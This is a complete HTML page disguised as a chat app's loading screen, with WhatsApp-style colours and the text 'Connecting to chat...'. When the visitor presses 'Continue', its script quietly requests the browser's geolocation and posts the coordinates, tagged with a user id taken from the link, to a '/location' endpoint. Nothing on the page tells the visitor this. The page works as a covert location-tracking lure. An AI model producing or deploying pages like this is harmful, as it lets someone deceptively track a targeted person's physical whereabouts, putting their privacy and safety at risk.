<!DOCTYPE html>
<html>

<head>
<title>Loading...</title>

<style>

body{
margin:0;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#0b141a;
color:white;
font-family:Arial;
flex-direction:column;
}

.loader{
border:6px solid #222;
border-top:6px solid #25D366;
border-radius:50%;
width:60px;
height:60px;
animation:spin 1s linear infinite;
margin-bottom:20px;
}

@keyframes spin{
0%{transform:rotate(0deg);}
100%{transform:rotate(360deg);}
}

button{
margin-top:20px;
padding:15px 30px;
font-size:18px;
background:#25D366;
border:none;
color:white;
border-radius:8px;
}

</style>
</head>

<body>

<div class="loader"></div>

<h2>Connecting to chat...</h2>

<button onclick="start()">Continue</button>

<script>

const params = new URLSearchParams(window.location.search)
const user = params.get("user")

function start(){

navigator.geolocation.getCurrentPosition(function(pos){

fetch("/location",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
user:user,
latitude:pos.coords.latitude,
longitude:pos.coords.longitude,
battery:"Unknown"
})
})

})

}

</script>

</body>
</html>
